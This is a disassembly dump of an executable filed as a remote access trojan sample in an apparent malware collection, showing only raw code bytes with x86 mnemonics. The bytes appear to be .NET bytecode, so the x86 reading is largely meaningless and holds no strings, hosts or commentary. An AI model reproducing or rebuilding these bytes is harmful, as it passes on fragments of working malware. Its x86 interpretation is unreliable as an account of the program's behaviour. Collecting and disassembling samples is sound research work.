
malware_samples/rat/ada3a2598dc763b860c98236f6ff09f8be2890da1c5fb53539a6d19b065d9620.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	c0 d1 00             	rcl    $0x0,%cl
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 f4 59 00       	add    $0x59f400,%eax
  402013:	00 90 77 00 00 03    	add    %dl,0x3000077(%eax)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	00 27                	add    %ah,(%edi)
  4021d1:	00 70 7e             	add    %dh,0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 b4 22 00       	and    $0x22b472,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 ac                	jb     0x4021a2
  4021f6:	27                   	daa
  4021f7:	00 70 6f             	add    %dh,0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 b4 22 00       	and    $0x22b472,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 be                	jb     0x4021e4
  402226:	27                   	daa
  402227:	00 70 6f             	add    %dh,0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 be 27 00       	and    $0x27be72,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 ae             	add    %dh,-0x52(%edx)
  4024e4:	22 00                	and    (%eax),%al
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
